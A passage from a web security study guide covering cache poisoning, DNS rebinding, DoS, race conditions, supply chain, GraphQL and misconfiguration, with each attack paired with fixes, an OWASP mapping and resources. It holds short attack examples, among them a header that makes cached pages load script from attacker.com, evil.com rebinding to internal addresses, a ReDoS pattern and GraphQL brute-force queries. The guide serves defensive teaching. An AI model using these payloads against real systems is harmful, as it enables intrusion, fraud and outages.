                         onto the next victim's request
```

### Impact

Prefixing a victim's request (capturing their session, redirecting them), bypassing front-end security controls (the smuggled request never passed the WAF), cache poisoning, and credential capture.

### The fix / principle

Normalise requests at the edge: make the front-end and back-end agree on message parsing, reject requests containing *both* `Content-Length` and `Transfer-Encoding`, reject malformed `Transfer-Encoding`, and prefer HTTP/2 end-to-end (which frames messages unambiguously with explicit lengths, eliminating the class — though HTTP/2→HTTP/1 downgrade at a proxy can reintroduce it). Keep proxies and servers patched; this is largely an implementation-discrepancy bug.

---

## 43. Web Cache Poisoning

**What it is:** An attacker gets a harmful response cached under a key that legitimate users share, so the cache serves the attacker's payload to everyone.

**Mechanism:** Caches key responses on a subset of the request (usually method + path + some headers). If an *unkeyed* input (a header not in the cache key, like `X-Forwarded-Host`) influences the response, the attacker sends a request that poisons the cached copy; subsequent users with the same cache key receive it.

### The attack

```
GET /home HTTP/1.1
Host: app.example.com
X-Forwarded-Host: attacker.com        ← unkeyed, but reflected into the page

# If the app builds an absolute script URL from X-Forwarded-Host and the
# response is cached by (method,path,Host) only, the cached /home now loads
# <script src="//attacker.com/x.js"> for every visitor.
```

### The fix / principle

Ensure every input that influences a response is part of the cache key, or does not influence the response at all. Do not reflect unkeyed headers (`X-Forwarded-Host`, `X-Forwarded-Scheme`) into cached content. Set precise `Cache-Control` and `Vary` headers, cache only truly static/public responses, and never cache anything derived from untrusted headers.

---

## 44. Web Cache Deception

**What it is:** The inverse of poisoning — an attacker tricks the cache into storing a victim's *private* response under a URL the attacker can then fetch.

**Mechanism:** Caches often store responses for "static-looking" paths (ending `.css`, `.js`, `.jpg`). If the app ignores a trailing path segment and serves the user's private page for `/account/profile.css`, but the cache sees `.css` and stores it, the attacker requests `/account/profile.css` and receives the victim's cached private data.

### The attack

```
# Attacker sends the victim this link:
https://app.example.com/account/settings.css

# The app ignores ".css", returns the victim's settings page (with their data).
# The cache sees ".css", caches it as a static asset.
# The attacker then fetches the same URL and gets the cached private page.
```

### The fix / principle

Cache based on the actual `Content-Type` and explicit `Cache-Control`, not on the URL's apparent extension. Make the origin return `Cache-Control: no-store` for authenticated responses, and configure the cache to never store responses to authenticated requests. Reject or normalise paths with unexpected trailing segments.

---

## 45. Subdomain Takeover

**What it is:** A DNS record (usually a `CNAME`) points at a third-party service that has been decommissioned, letting an attacker register that service and claim the subdomain.

**Mechanism:** `blog.example.com` `CNAME`s to `example.github.io`, but the GitHub Pages site is deleted. The DNS record dangles. An attacker creates a GitHub Pages site claiming `example.github.io` and now controls content on `blog.example.com` — a trusted subdomain.

### Impact

Serving malware or phishing from a trusted subdomain; stealing cookies scoped to `.example.com` (cookie tossing, §35); bypassing CORS/CSP allowlists that trust `*.example.com`; and completing OAuth flows if the subdomain is a registered redirect target.

### The fix / principle

Maintain an inventory of DNS records and the services they point to. Remove DNS records *before* decommissioning the backing service, and monitor for dangling records (a subdomain that resolves but returns the provider's "no such site" page). Scope cookies to exact hosts (`__Host-` prefix) so a taken-over sibling cannot set cookies for the parent domain.

---

## 46. DNS Rebinding

**What it is:** An attacker's domain resolves first to their own server (to deliver JavaScript), then re-resolves to an internal IP — letting the attacker's script in the victim's browser talk to internal services, bypassing the Same-Origin Policy and network firewalls.

**Mechanism:** The attacker serves a page from `evil.com` with a very short DNS TTL. After the page loads, they change `evil.com`'s DNS to point at `192.168.1.1` (the victim's router) or `169.254.169.254`. The victim's browser, still on the `evil.com` *origin*, now sends requests to the internal IP — same origin, from the browser's perspective, so SOP does not block reading the response.

### The fix / principle

Validate the `Host` header on internal services (reject requests whose `Host` is not the expected internal name — the rebound request carries `Host: evil.com`). Use DNS-rebinding protection in resolvers (reject private IPs in responses for public names). Require authentication on internal services rather than relying on network position. For SSRF-adjacent server code, re-validate the resolved IP at connection time and pin it.

---

## 47. Denial of Service

**What it is:** Exhausting a resource — CPU, memory, disk, connections, or a downstream dependency — so the service becomes unavailable. Application-layer DoS is often *asymmetric*: a tiny request triggers enormous work.

### The variants

```
# ReDoS — a "catastrophic backtracking" regex on attacker input
Pattern: ^(a+)+$        Input: "aaaaaaaaaaaaaaaaaaaaaaaa!"
→ the regex engine explores exponentially many paths; one request pegs a core
FIX: linear-time regex engines (RE2), avoid nested quantifiers, timeouts, input caps

# Decompression bomb — a 42 KB zip that expands to petabytes ("42.zip")
# Billion Laughs — nested XML entities expanding exponentially (§7)
FIX: cap decompressed size and nesting depth; stream with limits

# Slowloris — open many connections, send headers one byte at a time
→ exhausts the connection pool with almost no bandwidth
FIX: header/body read timeouts; connection limits per IP; a hardened front-end

# Algorithmic complexity — hash-collision flooding, quadratic parsers,
#   unbounded pagination (?limit=10000000), expensive endpoints (report gen)
FIX: bounded input sizes, pagination caps, async + rate-limited heavy ops

# Amplification via your own endpoints — an endpoint that fans out expensive work
FIX: rate limit, cache, make heavy work async and quota'd
```

### The fix / principle

Bound everything an attacker can influence: input size, regex complexity, decompression ratio, pagination limits, connection lifetime, and per-client request rate. Make expensive operations asynchronous and quota'd. Use linear-time regex engines for untrusted input. Put a hardened reverse proxy / CDN in front for connection-level and volumetric protection. The theme: eliminate *asymmetry* — no cheap request should cause expensive work.

---

# Part G — Logic, Supply Chain & APIs

---

## 48. Business Logic Flaws

**What it is:** The application works exactly as coded, but the *rules* it enforces can be abused — the vulnerability is in the logic, not in a technical mishandling of input. These are invisible to scanners because every request is individually valid.

### Examples

```
# Negative quantity → negative price → account credited
POST /cart  { "item": "book", "quantity": -5 }   → total = -$50 → refund

# Skipping a step in a multi-step flow
Go straight to /checkout/confirm without /checkout/payment

# Coupon / referral abuse
Apply the same one-time coupon via a race (§49), or stack coupons never meant to combine

# Price/parameter tampering the server trusts
POST /order  { "item": "laptop", "price": 1 }    → server trusts client price

# Replay of a legitimate request
Re-send a "transfer $100" request; server has no idempotency key

# Abusing "reset" or "trial" flows to gain unlimited free resource
```

### The fix / principle

Enforce every business invariant *server-side*: prices come from the server, quantities are bounded and positive, multi-step flows verify prior steps completed, one-time actions are marked used atomically (§49), and state transitions follow an explicit state machine. Threat-model each feature by asking "what does the user gain if they send this out of order, with extreme values, or twice?" Business logic testing is manual — automated tools cannot know your rules.

---

## 49. Race Conditions / TOCTOU

**What it is:** Time-Of-Check to Time-Of-Use: two operations that should be atomic are separated, so concurrent requests both pass a check before either commits the result — spending a one-time resource twice.

**Mechanism:** Check-then-act without a lock. Two requests read the same state (balance $100, coupon unused, one ticket left), both see it as valid, and both proceed.

### Vulnerable code

```python
# Withdraw — check then update, not atomic
def withdraw(user_id, amount):
    balance = db.get_balance(user_id)          # both requests read $100
    if balance >= amount:                      # both pass
        db.set_balance(user_id, balance - amount)   # both deduct → overdraft
```

### The attack

```
# Fire two simultaneous requests to withdraw the full balance:
POST /withdraw {amount: 100}   ×2 in parallel
→ balance goes to -$100. Also: redeem one gift card twice, use one coupon twice,
  buy the last item twice, bypass a "one vote per user" rule.
```

### The fix

```sql
-- Make the check and the update ONE atomic statement.
-- The row is only updated if the balance is still sufficient AT UPDATE TIME.
UPDATE accounts
SET balance = balance - $1
WHERE user_id = $2 AND balance >= $1
RETURNING balance;
-- 0 rows returned → insufficient funds (the other request won the race).
```

```python
# Or: SELECT ... FOR UPDATE inside a transaction (pessimistic lock),
# or an idempotency key that makes duplicate submissions no-ops,
# or a unique constraint that rejects the second use of a one-time token.
```

**The principle:** any "check a limited resource, then consume it" flow must be atomic — a single conditional `UPDATE`, a row lock, a unique constraint, or an idempotency key. Never read-decide-write across separate statements for anything an attacker can trigger concurrently. (This is the same bug as the reset-token race in §35's cousin and the OTP verification race — it recurs everywhere state is consumed.)

---

## 50. Supply Chain Attacks

**What it is:** Compromising the code, dependencies, or build/delivery pipeline rather than the running application — so malicious code arrives *through your own trusted channels*.

### The vectors

| Vector | Mechanism | Defence |
|---|---|---|
| **Malicious dependency** | A published package (or a compromised update) contains a backdoor | Pin versions + lockfile + integrity hashes; review updates |
| **Dependency confusion** | A public package shadows your internal package name at a higher version | Scoped names routed exclusively to the private registry |
| **Typosquatting** | `reqeusts` instead of `requests`; installed by a typo | Verify names; use a curated internal mirror |
| **Compromised CDN script** | A `<script src>` from a third party is altered | Subresource Integrity (SRI) hashes; self-host critical scripts |
| **Build pipeline compromise** | Malicious code injected during CI (SolarWinds, Codecov) | Signed, reproducible builds; least-privilege CI; provenance |
| **Compromised maintainer** | Social-engineered handover of a package (xz-utils, 2024) | Provenance, reproducible builds, review release artifacts vs source |

### The client-side case — SRI

```html
<!-- Without SRI: if the CDN is compromised, arbitrary JS runs on your origin -->
<script src="https://cdn.example.com/lib.js"></script>

<!-- With SRI: the browser refuses to run the script unless its hash matches -->
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

**The principle:** treat every dependency and build input as untrusted code that will run with your privileges. Pin exact versions with integrity hashes, use lockfiles, scan dependencies (Dependabot, `npm audit`, Snyk), route internal package names to private registries, add SRI to third-party scripts, and — for the build itself — sign artifacts and generate provenance so you can prove what you shipped is what you reviewed. (See `system breakdowns/Infrastructure & Cloud/CI CD Pipeline Security`.)

---

## 51. GraphQL-Specific Attacks

**What it is:** GraphQL's flexibility introduces its own attack surface — over-fetching, introspection disclosure, and query-complexity denial of service.

### The attacks

```graphql
# 1. Introspection — the full schema, exposed by default, maps the attack surface
{ __schema { types { name fields { name } } } }

# 2. Deeply nested query → exponential resolution (DoS)
{ user { friends { friends { friends { friends { name }}}}}}

# 3. Batching / aliasing to brute-force or amplify
query { a: login(pw:"1") b: login(pw:"2") c: login(pw:"3") ... }
# thousands of aliased attempts in one request, dodging per-request rate limits

# 4. IDOR through the graph — reaching another user's objects via a nested field
# 5. Field-level authorization gaps — a sensitive field returned because only
#    the top-level resolver checks authorization
```

### The fix / principle

Disable introspection in production (or restrict it); enforce query **depth and complexity limits** and a cost budget; rate-limit by *operation cost*, not request count, to defeat aliasing/batching; apply authorization at the **field/resolver level**, not just the entry point; and disable or bound query batching. Treat every resolver as an independent trust boundary.

---

## 52. Security Misconfiguration

**What it is:** The application, server, framework, or cloud service is deployed with insecure defaults, unnecessary features, or missing hardening — the most common category by frequency.

### The checklist

```
[ ] Default credentials changed (admin/admin, sample DB users)
[ ] Debug mode OFF in production (no stack traces, no debug consoles)
[ ] Directory listing disabled; dotfiles (.git, .env) blocked
[ ] Unused features/ports/services disabled (sample apps, admin consoles)
[ ] Security headers set: HSTS, CSP, X-Content-Type-Options, X-Frame-Options,
    Referrer-Policy
[ ] Verbose error messages replaced with generic ones
[ ] Cloud storage buckets private by default; no public S3/blob exposure
[ ] TLS configured well (1.2+, strong ciphers, no downgrade)
[ ] CORS restricted to an explicit allowlist (§23)
[ ] Cookies: HttpOnly, Secure, SameSite, __Host- prefix (§35)
[ ] Software patched; no known-vulnerable components (SCA scanning)
[ ] Least-privilege IAM for the app's DB/cloud/service accounts
[ ] Secrets in a secrets manager, not in code/env/images
```

### The security headers, concretely

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; object-src 'none'; frame-ancestors 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
```

**The principle:** harden by default, deny by default, and minimise. Every enabled feature, open port, default credential, and verbose message is attack surface. Automate configuration (infrastructure as code) so hardening is consistent and auditable rather than remembered per-deploy. This category overlaps every other one — a missing header re-enables clickjacking (§24), a permissive bucket becomes data exposure (§40), an unpatched library becomes RCE (§9, §38).

---

# Appendix A — OWASP Top 10 (2021) mapping

The OWASP Top 10 is the industry's consensus list of the most critical web risks. Here is how the attacks above map to it:

| OWASP 2021 category | Attacks in this document |
|---|---|
| **A01 Broken Access Control** | IDOR (§30), path traversal (§31), privilege escalation (§32), mass assignment (§33), CSRF (§21), CORS (§23) |
| **A02 Cryptographic Failures** | Cryptographic failures (§41), sensitive data exposure (§40), weak password hashing (§34) |
| **A03 Injection** | SQL (§1), NoSQL (§2), command (§3), LDAP (§5), XPath (§6), SSTI (§8), CRLF (§10), and XSS (§15–20) |
| **A04 Insecure Design** | Business logic flaws (§48), race conditions (§49) |
| **A05 Security Misconfiguration** | Misconfiguration (§52), XXE (§7), CORS (§23), default credentials |
| **A06 Vulnerable & Outdated Components** | Supply chain (§50), EL/OGNL library RCEs (§9), deserialization gadget chains (§38) |
| **A07 Identification & Authentication Failures** | Auth weaknesses (§34), session attacks (§35), JWT (§36), OAuth (§37) |
| **A08 Software & Data Integrity Failures** | Insecure deserialization (§38), supply chain (§50), SRI gaps (§50) |
| **A09 Security Logging & Monitoring Failures** | Log injection (§14); the detection notes throughout |
| **A10 Server-Side Request Forgery** | SSRF (§22), and its cousins DNS rebinding (§46), XXE-SSRF (§7) |

The Top 10 is a *awareness* document, not a checklist for completeness — several attacks here (request smuggling, cache poisoning, clickjacking) sit across or beneath its categories.

---

# Appendix B — Defensive cheat sheet

The whole document, compressed to the controls that matter most:

**Against injection (data-as-code):**
- Parameterised queries for SQL; typed schema validation for NoSQL.
- Argument arrays (never shell strings) for OS commands.
- Context-aware output encoding + CSP for XSS; a vetted sanitiser (DOMPurify) for rich text.
- Disable DTDs/external entities for XML (XXE).
- Never concatenate user input into template source (SSTI) or into `eval`.

**Against the confused deputy:**
- `SameSite` cookies + CSRF tokens (CSRF).
- Validate the resolved IP + block internal egress + IMDSv2 (SSRF).
- `frame-ancestors 'self'` (clickjacking).
- Verify `Origin`/`event.origin` (WebSocket, postMessage).
- Exact allowlists for CORS origins and OAuth redirect URIs.

**Against broken authorization:**
- Ownership check in the query itself, on every object access (IDOR).
- Canonicalise and confine file paths (traversal).
- Allowlist bindable fields (mass assignment).
- Derive privilege server-side; deny by default on admin routes.

**Around authentication:**
- Argon2id password hashing; rate limit per account; identical timing on the miss path.
- CSPRNG session ids; rotate on login; `HttpOnly; Secure; SameSite; __Host-`.
- Pin the JWT algorithm; validate `exp`/`aud`/`iss`.
- OAuth: PKCE, exact `redirect_uri`, validated `state` and `nonce`.

**Around data and crypto:**
- Data-only formats (JSON + schema) across trust boundaries; never `pickle`/`BinaryFormatter` on input.
- Validate upload content (not extension); store outside web root; re-encode images.
- Authenticated encryption (AES-GCM); CSPRNG for all secrets; never reuse a nonce.
- Minimise what you return and log; allowlist response fields.

**Infrastructure and logic:**
- Make heavy work atomic (race conditions) and bounded (DoS).
- Consistent request parsing edge-to-back-end (smuggling); precise cache keys and `Cache-Control` (cache attacks).
- Pin dependencies with integrity hashes; SRI on third-party scripts; monitor DNS for dangling records.
- Enforce business invariants server-side; harden and minimise everything (misconfiguration).

**The three questions to ask of any feature:**
1. Is any string here interpreted as code somewhere downstream? → injection.
2. Could a privileged component be tricked into acting for an attacker? → confused deputy.
3. Does this check who you are but not whether you may touch *this* object? → broken authorization.

---

# Appendix C — Further Reading & External Resources

Authoritative, stable references for going deeper on every attack class in this guide. These are the sources professionals actually use — standards bodies, the tool vendors' own academies, and canonical cheat sheets.

**OWASP — the foundational references**
- OWASP Top 10 (2021) — https://owasp.org/Top10/
- OWASP API Security Top 10 (2023) — https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OWASP Web Security Testing Guide (WSTG) — https://owasp.org/www-project-web-security-testing-guide/
- OWASP Cheat Sheet Series (the single best quick-reference set) — https://cheatsheetseries.owasp.org/
- OWASP ASVS (Application Security Verification Standard) — https://owasp.org/www-project-application-security-verification-standard/
- OWASP Automated Threats to Web Applications — https://owasp.org/www-project-automated-threats-to-web-applications/

**PortSwigger Web Security Academy — free, hands-on labs (the best single learning resource)**
- Academy home & learning paths — https://portswigger.net/web-security
- SQL injection — https://portswigger.net/web-security/sql-injection
- Cross-site scripting (XSS) — https://portswigger.net/web-security/cross-site-scripting
- CSRF — https://portswigger.net/web-security/csrf
- SSRF — https://portswigger.net/web-security/ssrf
- XXE injection — https://portswigger.net/web-security/xxe
- Server-side template injection — https://portswigger.net/web-security/server-side-template-injection
- Access control & IDOR — https://portswigger.net/web-security/access-control
- Authentication vulnerabilities — https://portswigger.net/web-security/authentication
- JWT attacks — https://portswigger.net/web-security/jwt
- OAuth 2.0 authentication vulnerabilities — https://portswigger.net/web-security/oauth
- Insecure deserialization — https://portswigger.net/web-security/deserialization
- HTTP request smuggling — https://portswigger.net/web-security/request-smuggling
- Web cache poisoning — https://portswigger.net/web-security/web-cache-poisoning
- Web cache deception — https://portswigger.net/web-security/web-cache-deception
- CORS — https://portswigger.net/web-security/cors
- Clickjacking — https://portswigger.net/web-security/clickjacking
- GraphQL API vulnerabilities — https://portswigger.net/web-security/graphql
- Race conditions — https://portswigger.net/web-security/race-conditions
- Business logic vulnerabilities — https://portswigger.net/web-security/logic-flaws

**Specifications & standards (when you need the ground truth)**
- MDN Web Docs — HTTP, CORS, cookies, CSP, SameSite — https://developer.mozilla.org/en-US/docs/Web/HTTP
- Content Security Policy (CSP) reference — https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- RFC 9110 (HTTP Semantics) — https://www.rfc-editor.org/rfc/rfc9110
- RFC 6749 (OAuth 2.0) & RFC 7636 (PKCE) — https://www.rfc-editor.org/rfc/rfc6749 / https://www.rfc-editor.org/rfc/rfc7636
- RFC 7519 (JSON Web Token) — https://www.rfc-editor.org/rfc/rfc7519
- OAuth 2.0 Security Best Current Practice — https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics

**Vulnerability catalogues & threat knowledge bases**
- CWE (Common Weakness Enumeration) — https://cwe.mitre.org/
- MITRE ATT&CK — https://attack.mitre.org/
- CVE / NVD (National Vulnerability Database) — https://nvd.nist.gov/
- CISA Known Exploited Vulnerabilities (KEV) catalog — https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**Tools**
- Burp Suite — https://portswigger.net/burp
- OWASP ZAP — https://www.zaproxy.org/
- sqlmap — https://sqlmap.org/
- Nuclei (templated vuln scanning) — https://github.com/projectdiscovery/nuclei
- OWASP Dependency-Check (SCA) — https://owasp.org/www-project-dependency-check/

**Practice & payloads**
- PayloadsAllTheThings (payload/technique reference) — https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks (pentest methodology) — https://book.hacktricks.xyz/
- Hacker101 & HackerOne public reports (real-world writeups) — https://www.hacker101.com/ / https://hackerone.com/hacktivity
- OWASP Juice Shop (deliberately vulnerable app) — https://owasp.org/www-project-juice-shop/

**Cross-reference:** the companion guide [mobile_security_attacks_complete_guide.md](mobile_security_attacks_complete_guide.md) covers mobile-specific attacks (insecure storage, pinning bypass, reverse engineering, IPC/WebView) — mobile apps inherit every server-side bug in *this* guide through their APIs.

---

*End of document. This is a study reference; for the deep, system-level breakdowns of authentication, APIs, and infrastructure that several sections point to, see the `system breakdowns/` directory. Cross-check specific payloads against current sources (PortSwigger Web Security Academy, OWASP Testing Guide, OWASP Cheat Sheet Series) before relying on them in an assessment — attack techniques evolve.*

